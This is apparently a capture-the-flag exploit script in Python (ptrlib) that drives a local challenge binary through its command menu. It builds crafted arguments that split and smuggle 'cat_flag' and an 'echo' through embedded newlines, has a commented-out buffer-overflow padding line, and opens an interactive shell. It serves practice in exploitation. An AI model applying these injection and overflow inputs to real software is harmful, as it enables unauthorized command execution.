from ptrlib import *

file = "./chal"
e = ELF(file)
#libc = ELF("")
sock = Process(file)
#sock = Socket("")
sock.debug = True

def push_command(command_index, argument=None):
    sock.sendlineafter("Enter command: ", "1")
    sock.sendlineafter("Enter command: ", str(command_index))
    if argument:
        sock.sendlineafter("Enter argument: ", argument)

def pop_command(index):
    sock.sendlineafter("Enter command: ", "2")
    sock.sendlineafter("Enter index to remove: ", str(index))

def execute_sequence():
    sock.sendlineafter("Enter command: ", "3")

def clear_sequence():
    sock.sendlineafter("Enter command: ", "4")

def show_sequence():
    sock.sendlineafter("Enter command: ", "5")

def exit_program():
    sock.sendlineafter("Enter command: ", "6")

input(">")
#deadbeef = p64(0xdeadbeef)
#print(f"{len(deadbeef)=}")
#push_command(4, deadbeef+b"A"*(0x404-len(deadbeef))+b"\x00\x00\x00\x00"+b"B"*0x1c+b"cat_flag\n")

push_command(4, b"cat_f")
push_command(4, b" \x0aecho lag   ")
push_command(4, b"     ")
pop_command(2)

show_sequence()

#execute_sequence()

#exit_program()

sock.sh()
